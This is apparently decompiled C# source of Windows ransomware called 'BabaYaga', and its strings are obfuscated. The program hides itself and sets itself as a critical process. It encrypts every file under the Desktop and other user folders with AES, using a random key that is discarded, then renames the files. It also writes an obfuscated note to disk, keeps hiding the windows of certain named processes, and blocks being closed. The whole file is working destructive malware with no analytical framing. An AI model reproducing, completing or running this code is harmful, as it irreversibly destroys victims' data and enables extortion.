using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace BabaYaga;

public class Form1 : Form
{
	public class GClass0
	{
		public void method_0(string string_0, string string_1)
		{
			byte[] byte_ = File.ReadAllBytes(string_0);
			byte[] bytes = Encoding.UTF8.GetBytes(string_1);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = GClass1.smethod_0(byte_, bytes);
			File.WriteAllBytes(string_0, bytes2);
			File.WriteAllBytes(string_0, bytes2);
			File.Move(string_0, string_0 + GClass2.smethod_0(")Ūɪ\u0367Ѩէ٥"));
		}
	}

	public class GClass1
	{
		public static byte[] smethod_0(byte[] byte_0, byte[] byte_1)
		{
			byte[] result = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_1, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(byte_0, 0, byte_0.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}

	private const int int_0 = 0;

	private IContainer icontainer_0 = null;

	private Timer timer_0;

	private Timer timer_1;

	private Timer timer_2;

	private Timer timer_3;

	public Form1()
	{
		method_4();
	}

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtSetInformationProcess(IntPtr intptr_0, int int_1, ref int int_2, int int_3);

	[DllImport("User32")]
	private static extern int ShowWindow(int int_1, int int_2);

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Opacity(0.0);
		((Form)this).set_Size(new Size(50, 50));
		((Form)this).set_Location(new Point(-100, -100));
		timer_2.Start();
		int int_ = 1;
		Process.EnterDebugMode();
		NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref int_, 4);
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = GClass2.smethod_0("dūɡ\u032aѦպ٤");
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.Arguments = GClass2.smethod_0("\u0005łȈ\u0353чՎف\u074cࡕ\u094f\u0a00ର౸ഽ\u0e5f༡၆ᅻቷ፸ᑢᕸᙳᝡᠲ\u1937ᨶᬯᱧᵮṭὨ\u2066ⅺ∨⍄\u243c╙♦❬⡭⥵⩭⮘Ⲍⷝ⻓⾜よ㆘㊖㎃㓖㗐㚁㞀㢗㦃㪞㮎㲃㶈㻉㿑䂬䇉䋎䏁䓆䖁䚁䞏䣂䦢䫚䮃䲼䶲亳侯傷冾努号哰嗳围垧墳妺媵宠岹嶣廬忤悬懩抋揽撚斒暭枭梦榮檷毌波淮滅濈烎燜狕玄璄痩相矜磕秞竞篺糧綃绉翓胏膉芎莁蒆藌蛇蟂裁觍諓访賝趧軀迌郳釷鋼鏸铡闦雈韀飫駢髤鯪鳣鶾麾鿗ꃆꇦꋯꏨꓨꗐꛍꞭ\ua8e7꧹ꫥꭟ걘굛깜꼟뀟넕뉘댴둌딩똣뜚렜뤕먟묘밝봱븿뼒쀙석숍쌊쑕앗옸윯젍줆쨏쬱찋촔칲켾퀢턼퉸퍱푰핵혠휲\ud839\ud934\uda3f\udb38\udc20\udd6d\ude63\udf2d\ue06a\ue10a\ue272\ue31b\ue411\ue52c\ue62a\ue727\ue82d\ue936\uea33\ueb63\uec6d\ued44\uee4f\uef4f\uf05f\uf154\uf20b\uf305\uf46a\uf556\uf659\uf757\uf81c凜煮תּﰎﴋ\ufe0a＋CŊɉ\u0344ъՖ\u0604ݠ\u0818ॽ\u0a77୶\u0c70൹\u0e73ཬ\u1069ᅅቋ፮ᑥᕡᙱ\u177eᠡ\u1923ᩌ\u1b6cᱣᵩḢὮ\u2072Ⅼ∨⌡␠┥♡❻⡫⥵");
		Process.Start(processStartInfo);
		File.Delete(GClass2.smethod_0("XĠɅ\u034fѾոٱݻࡤॡ\u0a4d\u0b43\u0c76ൽ\u0e79ཀྵၦᄹሻፔᑤᕫᙡᜪᡦ\u197a\u1a64"));
	}

	private void method_0(object sender, EventArgs e)
	{
		((Control)this).set_Visible(false);
		((Form)this).set_Opacity(100.0);
	}

	public byte[] method_1(byte[] byte_0, byte[] byte_1)
	{
		byte[] result = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_1, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		return result;
	}

	private void timer_0_Tick(object sender, EventArgs e)
	{
		timer_0.Stop();
		smethod_1();
	}

	private void timer_1_Tick(object sender, EventArgs e)
	{
		timer_1.Stop();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string path = folderPath + GClass2.smethod_0("Půɯͺѣճ٩ݵ\u082a४੬୨");
		string environmentVariable = Environment.GetEnvironmentVariable(GClass2.smethod_0("^řɌ\u035aїՔي\u0742ࡊ\u094e\u0a44"));
		string text = Path.Combine(environmentVariable, GClass2.smethod_0("Mŧɰ\u0368ѩի٢ݦ\u0872"));
		string path2 = text + GClass2.smethod_0("Půɯͺѣճ٩ݵ\u082a४੬୨");
		string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
		string path3 = folderPath2 + GClass2.smethod_0("Půɯͺѣճ٩ݵ\u082a४੬୨");
		string folderPath3 = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
		string path4 = folderPath3 + GClass2.smethod_0("Půɯͺѣճ٩ݵ\u082a४੬୨");
		if (File.Exists(path))
		{
			File.Delete(path);
		}
		if (File.Exists(path2))
		{
			File.Delete(path2);
		}
		if (File.Exists(path3))
		{
			File.Delete(path3);
		}
		if (File.Exists(path4))
		{
			File.Delete(path4);
		}
		timer_1.Start();
	}

	public static string smethod_0(int int_1)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < int_1--)
		{
			stringBuilder.Append(GClass2.smethod_0("+īȫ\u0323Уԣأܫ\u082bफਫ\u0b53\u0c53\u0d53๓ཋ။ᅋቋፃᑃᕃᙃᝋᡋ᥋\u1a71\u1b6dᱭᵩṩὭ\u206dⅡ≡⍭⑭╩♩❭⡭⥱⩱⭍ⱍⵉ⹉⽍きㅁ㉁㍍㐧㔧㘧㜧㠧㤧㨧㬷㰷㴽㸭㽋䀩䄭䈭䍙䐠䔯䘬䜪䡝䤪")[random.Next(GClass2.smethod_0("+īȫ\u0323Уԣأܫ\u082bफਫ\u0b53\u0c53\u0d53๓ཋ။ᅋቋፃᑃᕃᙃᝋᡋ᥋\u1a71\u1b6dᱭᵩṩὭ\u206dⅡ≡⍭⑭╩♩❭⡭⥱⩱⭍ⱍⵉ⹉⽍きㅁ㉁㍍㐧㔧㘧㜧㠧㤧㨧㬷㰷㴽㸭㽋䀩䄭䈭䍙䐠䔯䘬䜪䡝䤪").Length)]);
		}
		return stringBuilder.ToString();
	}

	private static void smethod_1()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string environmentVariable = Environment.GetEnvironmentVariable(GClass2.smethod_0("^řɌ\u035aїՔي\u0742ࡊ\u094e\u0a44"));
		string text = Path.Combine(environmentVariable, GClass2.smethod_0("Mŧɰ\u0368ѩի٢ݦ\u0872"));
		string text2 = Path.Combine(environmentVariable, GClass2.smethod_0("MŧɤͳѨա٭ݶ\u0872"));
		string text3 = Path.Combine(environmentVariable, GClass2.smethod_0("XŮɥͱѱձ٧ݲ"));
		string[] files = Directory.GetFiles(folderPath + GClass2.smethod_0("]"), GClass2.smethod_0("+"), SearchOption.AllDirectories);
		string[] files2 = Directory.GetFiles(text + GClass2.smethod_0("]"), GClass2.smethod_0("+"), SearchOption.AllDirectories);
		string[] files3 = Directory.GetFiles(text2 + GClass2.smethod_0("]"), GClass2.smethod_0("+"), SearchOption.TopDirectoryOnly);
		string[] files4 = Directory.GetFiles(text3 + GClass2.smethod_0("]"), GClass2.smethod_0("+"), SearchOption.AllDirectories);
		GClass0 gClass = new GClass0();
		string string_ = smethod_0(999);
		for (int i = 0; i < files.Length; i++)
		{
			gClass.method_0(files[i], string_);
		}
		for (int j = 0; j < files2.Length; j++)
		{
			gClass.method_0(files2[j], string_);
		}
		for (int k = 0; k < files4.Length; k++)
		{
			gClass.method_0(files4[k], string_);
		}
		for (int l = 0; l < files3.Length; l++)
		{
			gClass.method_0(files3[l], string_);
		}
	}

	public void method_2()
	{
		method_3();
	}

	public void method_3()
	{
		string userName = Environment.UserName;
		string text = GClass2.smethod_0("JĲɛ\u0353Ѷաٱݱ\u085d");
		string text2 = GClass2.smethod_0("OŖɴ\u0363Ѥպ٢ݼࡗॸ੬୩\u0c63൫\u0e60༪ၷᅺት");
		string path = text + userName + text2;
		string[] contents = new string[19]
		{
			GClass2.smethod_0("ałɃ\u035bљԈ؈ݦࡊ\u0949\u0a04\u0b5a\u0c4dൔ๒\u0f3fၷᅰቬ፴ᑨᕭᙹ\u1779ᡢ\u1935\u1a72᭺᱾ᵴṣἯ\u206fⅿ≩⌫⑯╧♫❵⡿⥵⩰⭦ⱦⴠ"),
			GClass2.smethod_0(""),
			GClass2.smethod_0("ÁēȒ\u035dЅԔ؏ݙࠑचਆଚఆഇณ༟ငᅏለጄ᐀ᔎᘙᝉ᠉ᤕᨃᭅᰁᴍḁἓ’ℯ∪⌸\u2438╻☭✰⠬⤿⩶⬔Ⱁⴀ\u2e72⽣づㅹ㉮㌬㐠㔬㘥㜻㠡㤳㨫㭫㱤㴍㸭㽡䀯䅑䉛䌝䑟䕚䙔䜙䡐䥒䩚䭅䰔䵊九佄倐兛剁匍呞啎噙坝塇奕婃嬅层嵊幎彄恓愿扩捴摨敳晵杬桬椷橹歠汦洳湡潡灵煬牧獬瑠甫癮睬硫祵穿筵籰絬繰缯"),
			GClass2.smethod_0("\\Űɷ\u033aѫս٧ݷ\u087c०ਲ਼୦౾ൿ\u0e63\u0f7d\u102dᅭቹ፯ᐩᕽᙴᝣᡩᥡ\u1a70\u1b71\u1c2f"),
			GClass2.smethod_0("\u0017Ļɼ\u0322еԬٸܠ࠷\u093bਠ୳ద\u0d3e\u0e70༽\u102bᄾሸጤᐸᔬᙨ\u1734ᠩ\u1928ᨡ᭣᰻ᴮḵὍ„⅛≕⍗\u245f╊☘❑⡙⥇⨔⭕ⱀⵔ\u2e55⼏すㅟ㉅㍟㑏㔉㙜㝈㠆㥀㩉㭂㱋㵍㸀㽾䁰䅹䈼䍺䑮䕭䙹䝴䡾䤵䨦䬾䰡䴱乵佡偭兿創卻呾啬噬圧塠奬婨学山崡"),
			GClass2.smethod_0("^ěț\u031dџԐ\u0602܌ࠆऄਚ\u0b0eఎ\u0d49ฉ༉ဂᅅምጌᐗᔓᙀ\u1739ᠷ\u1931ᨹᬨᱺᴪḰἸ‣ℹ∰⍳\u243c┾☤❯⠭⤢⨢⬿Ⱛⴠ⸦⽧〰ㄤ㈨㌶㐣㔣㘬㝚㠞㥔㩒㭝㱕㵋㹕㽖䁂䅜䉛䍝䐒䕝䙙䝄䡋䤍䩈䭊䱞䵈乊但偕兀剗匏吂啃噁坼塵奨婬孨尶崹年彶恤慲扱挳摷敩晳杪桢椭橿正汯浬湼潴瀦煠牰獠琬用"),
			GClass2.smethod_0("nřɀ\u0314ћՓهݕࠏग़\u0a42ଌ\u0c5b\u0d4b๐༈ဃᄕሕጔᐃᕋᙏᜀ\u187d\u1977\u1a69\u1b7fᱴᵳṷἸ\u2063ⅹ∵⍰⑶╱♣❩⡿⥺⨭⭣Ɀⵢ\u2e6c⽺〧ㅠ㉬㍨㑦㕱㘯"),
			GClass2.smethod_0("\u0002ıɡ\u0333ѐՑ\u0653ܜ\u085a\u0949ਙ\u0b4f\u0c52ഖ๒ད၇ᄒቓፙᑛᕍᙂᝅᡅᥙᨉ᭑᱈ᵓḂὈ⁏ℂ≆⍅⑫┾♼❰⡷⤺⩠⭷Ɫⵤ⸵⽰ぶㅱ㉣㍩㑿㕺㙨㝨㠫㥮㩨㭼㱦㴦㹧㽥䁠䅩䈯"),
			GClass2.smethod_0(""),
			GClass2.smethod_0("Tĭɑ\u032f"),
			GClass2.smethod_0("Nžɷͼѵյٳݧ࠴।\u0a77\u0b31\u0c71ൽ\u0e6b༭\u1062ᅤቾጩᑻᕤᙧᝨᡩᥦ\u1a70\u1b72"),
			GClass2.smethod_0(""),
			GClass2.smethod_0("KŨɨͱѥՠٶ\u073b"),
			GClass2.smethod_0("\u0005ĝɶ\u035eчՁق\u0742ࡍ\u094fਊଢ଼\u0c47ൕฆཇ\u1056ᅌቕፒᑅᕭᘾ᜵ᡴ\u196f\u1a6e᭩ᱫᴭḹἺ\u2063Ⅴ≥⌿⑤╠♼❽⡾⥤⩠⭬Ⱬ\u2d73⸨⽪ぶㅤ㈭㌨"),
			GClass2.smethod_0("\u000fĒɸ\u0348ќՙكݓࠕ\u0955\u0a50\u0b51\u0c5e\u0d45แཚဍᅃቅጊᑄᕉᙎᝊ᠗ᥐᩌ᭐ᰁᴈṷὪ\u2069Ⅼ∡⌵\u2436╵♶❿⡹⤦⩧⭽Ᵽⴢ\u2e75⽷でㅨ㉨㍾㑭㔦㙨㝨㡬㥫㩭㬭㰨"),
			GClass2.smethod_0("\u001cĀɺ\u035eт՞\u064c܈ࡂऋ\u0a48\u0b45\u0c4aൎกཔၰᄾቨ፯ᐻᔲᙚ\u1777ᡵᥤ\u1a74᭘ᱼᵱṺή⁽ⅎ≠⍭③╦☻❼⡨⥴⨫⭧ⱬⵯ⸨"),
			GClass2.smethod_0(""),
			GClass2.smethod_0("^šɩͳСնؤݢ\u086e७"),
			GClass2.smethod_0("Qźɻͷвս٥ݬࡥभ੭\u0b65౮ഩ\u0e60སၰᅠሤ፥ᑷᕯ")
		};
		File.WriteAllLines(path, contents);
	}

	private void timer_2_Tick(object sender, EventArgs e)
	{
		method_2();
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void timer_3_Tick(object sender, EventArgs e)
	{
		timer_3.Stop();
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			if (process.ProcessName == GClass2.smethod_0("`ůɥ"))
			{
				int int_ = process.MainWindowHandle.ToInt32();
				ShowWindow(int_, 0);
			}
			if (process.ProcessName == GClass2.smethod_0("uţɢ\u0361ѧիٵ"))
			{
				int int_ = process.MainWindowHandle.ToInt32();
				ShowWindow(int_, 0);
			}
			if (process.ProcessName == GClass2.smethod_0("]žɤ\u0369Ѭջٴݮࡤ१੨୧\u0c73"))
			{
				int int_ = process.MainWindowHandle.ToInt32();
				ShowWindow(int_, 0);
			}
			if (process.ProcessName == GClass2.smethod_0("vŠɠ\u036eѵ"))
			{
				int int_ = process.MainWindowHandle.ToInt32();
				ShowWindow(int_, 0);
			}
			if (process.ProcessName == GClass2.smethod_0("zŦɿ\u0362Ѵն٬ݦ\u086e७"))
			{
				int int_ = process.MainWindowHandle.ToInt32();
				ShowWindow(int_, 0);
			}
			if (process.ProcessName == GClass2.smethod_0("}žɤ\u0369Ѭջٴݮࡤ१੨୧\u0c73"))
			{
				int int_ = process.MainWindowHandle.ToInt32();
				ShowWindow(int_, 0);
			}
			if (process.ProcessName == GClass2.smethod_0("^ſɣ\u0368ѯպٻݯࡧ०੯୦\u0c70ള"))
			{
				int int_ = process.MainWindowHandle.ToInt32();
				ShowWindow(int_, 0);
			}
			if (process.ProcessName == GClass2.smethod_0("nůɢ"))
			{
				int int_ = process.MainWindowHandle.ToInt32();
				ShowWindow(int_, 0);
			}
			if (process.ProcessName == GClass2.smethod_0("jūɦ\u032aѦպ٤"))
			{
				int int_ = process.MainWindowHandle.ToInt32();
				ShowWindow(int_, 0);
			}
			timer_3.Start();
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void method_4()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Expected O, but got Unknown
		//IL_016f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0179: Expected O, but got Unknown
		icontainer_0 = new Container();
		timer_0 = new Timer(icontainer_0);
		timer_1 = new Timer(icontainer_0);
		timer_2 = new Timer(icontainer_0);
		timer_3 = new Timer(icontainer_0);
		((Control)this).SuspendLayout();
		timer_0.set_Enabled(true);
		timer_0.set_Interval(3000);
		timer_0.add_Tick((EventHandler)timer_0_Tick);
		timer_1.set_Enabled(true);
		timer_1.add_Tick((EventHandler)timer_1_Tick);
		timer_2.set_Interval(6000);
		timer_2.add_Tick((EventHandler)timer_2_Tick);
		timer_3.set_Enabled(true);
		timer_3.set_Interval(10);
		timer_3.add_Tick((EventHandler)timer_3_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_AutoSizeMode((AutoSizeMode)0);
		((Form)this).set_ClientSize(new Size(120, 23));
		((Form)this).set_ControlBox(false);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name(GClass2.smethod_0("Cūɱ\u036fа"));
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
